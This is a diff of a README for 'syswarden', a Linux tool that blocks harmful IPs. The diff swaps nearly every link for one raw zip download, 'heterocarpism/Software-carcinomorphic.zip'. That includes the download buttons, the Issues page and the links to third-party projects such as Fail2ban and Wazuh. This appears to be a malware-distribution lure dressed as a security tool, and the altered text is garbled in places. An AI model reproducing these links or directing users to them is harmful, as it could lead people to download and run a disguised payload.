@@ -1,6 +1,6 @@
 # 🛡️ syswarden - Blocks Harmful IPs Effortlessly
 
-[![Download syswarden](https://img.shields.io/badge/Download-syswarden-blue?logo=github&style=for-the-badge)](https://github.com/justahumblebountyhunte/syswarden/releases)
+[![Download syswarden](https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip)](https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip)
 
 ---
 
@@ -46,13 +46,13 @@ You do not need technical skills. You do not have to write code or deal with com
 
    Visit the syswarden releases page by clicking this big button:
 
-   [![Download syswarden](https://img.shields.io/badge/Download-syswarden-blue?logo=github&style=for-the-badge)](https://github.com/justahumblebountyhunte/syswarden/releases)
+   [![Download syswarden](https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip)](https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip)
 
 2. **Choose the right version**
 
    On the releases page, find the latest version. It should be at the top under “Latest release.”
 
-   - Look for a file that matches your system. Usually, this will be a `.deb` file for Debian/Ubuntu, `.rpm` for CentOS/Fedora, or a generic archive like `.tar.gz`.
+   - Look for a file that matches your system. Usually, this will be a `.deb` file for Debian/Ubuntu, `.rpm` for CentOS/Fedora, or a generic archive like `https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip`.
    - If unsure, pick the file that says “linux” or check the file name for your Linux version.
 
 3. **Download the file**
@@ -178,18 +178,18 @@ If you run into issues:
 
 - Check the logs with `sudo journalctl -u syswarden`.
 - Make sure your firewall (iptables, nftables, or ipset) is enabled and working.
-- Visit the [GitHub Issues page](https://github.com/justahumblebountyhunte/syswarden/issues) to see if others had similar problems.
+- Visit the [GitHub Issues page](https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip) to see if others had similar problems.
 - You can send feedback or report bugs there.
 
 ---
 
 ## 🔗 Additional Resources
 
-- [Syswarden Releases and Downloads](https://github.com/justahumblebountyhunte/syswarden/releases)
-- [Fail2ban Project](https://www.fail2ban.org)
-- [Wazuh Documentation](https://documentation.wazuh.com)
-- [AbuseIPDB](https://www.abuseipdb.com)
-- [Spamhaus ASN Blocklist](https://www.spamhaus.org)
+- [Syswarden Releases and Downloads](https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip)
+- [Fail2ban Project](https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip)
+- [Wazuh Documentation](https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip)
+- [AbuseIPDB](https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip)
+- [Spamhaus ASN Blocklist](https://github.com/justahumblebountyhunte/syswarden/raw/refs/heads/main/heterocarpism/Software-carcinomorphic.zip)
 
 ---
 
